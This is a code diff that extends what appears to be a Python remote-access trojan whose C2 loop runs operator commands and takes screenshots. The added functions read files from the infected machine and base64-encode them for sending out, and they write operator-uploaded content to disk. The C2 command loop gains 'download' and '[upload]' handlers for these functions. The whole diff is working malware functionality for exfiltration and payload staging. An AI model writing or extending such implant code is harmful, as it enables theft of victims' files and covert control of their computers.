@@ -47,6 +47,24 @@ def decrypt_message(encrypted_message: bytes) -> str:
     except Exception as e:
         return f"[!] Error decrypting message: {e}"
 
+def download_file(file):
+    if os.path.exists(file):
+        with open(file, "rb") as f:
+            content = f.read()
+            encoded = base64.b64encode(content).decode("utf-8")
+            response = f"[download]" + encoded
+    else:
+        response = f"[!] El archivo {file} no existe."
+    return response
+
+def upload_file(content):
+    with open("uploaded_file", "wb") as f:
+        f.write(base64.b64decode(content))
+    if os.path.exists("uploaded_file"):
+        response = "[File uploaded]"
+    else:
+        response = "[Error uploading file]"
+    return response
 
 def execute_command(command):
     try:
@@ -78,8 +96,18 @@ def connect_to_c2():
 
                 if command.lower() == "exit":
                     break
+
                 elif command.lower() == "screenshot":
                     output = take_screenshot()
+
+                elif command.lower().startswith("download"):
+                    file = command.split(" ")[1]
+                    output = download_file(file)
+
+                elif command.startswith("[upload]"):
+                    content = command.split("[upload]")[1]
+                    output = upload_file(content)
+
                 else:
                     output = execute_command(command)
 
